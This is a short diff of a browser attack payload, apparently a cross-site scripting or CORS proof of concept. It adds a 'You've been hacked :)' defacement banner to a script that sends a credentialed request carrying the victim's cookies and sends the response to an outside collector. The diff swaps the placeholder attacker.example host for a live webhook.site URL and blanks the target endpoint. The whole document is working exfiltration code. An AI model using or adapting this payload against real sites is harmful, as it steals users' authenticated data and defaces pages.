@@ -1,10 +1,13 @@
+<h1>HELLO</h1>
+<p>You've been hacked :)</p>
+
 <script>
   var req = new XMLHttpRequest();
   req.onload = function() {
     // Exfiltrate the stolen data to an attacker-controlled server
-    new Image().src = 'https://attacker.example/log?data=' + encodeURIComponent(this.responseText);
+    new Image().src = 'https://webhook.site/3df0db66-6f37-4be7-9c78-2e760a961f4c' + encodeURIComponent(this.responseText);
   };
-  req.open('GET', 'https://victim.example.com/api/sensitive-endpoint', true);
+  req.open('GET', '', true);
   req.withCredentials = true; // This sends the victim's cookies
   req.send();
 </script>
